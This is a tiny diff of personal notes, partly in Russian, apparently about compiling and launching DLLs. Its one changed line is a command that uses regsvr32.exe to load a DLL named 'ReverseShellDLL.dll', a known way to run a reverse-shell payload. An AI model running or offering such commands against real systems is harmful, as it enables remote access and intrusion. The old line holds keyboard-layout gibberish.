@@ -1,6 +1,6 @@
 # c-c-
  
- regsrv32 payload.dll (pfgecrftv dll)
+regsvr32.exe ReverseShellDLL.dll (запуск dll)
  
 -static     компиляция со всеми билиотеками во внутрь
 
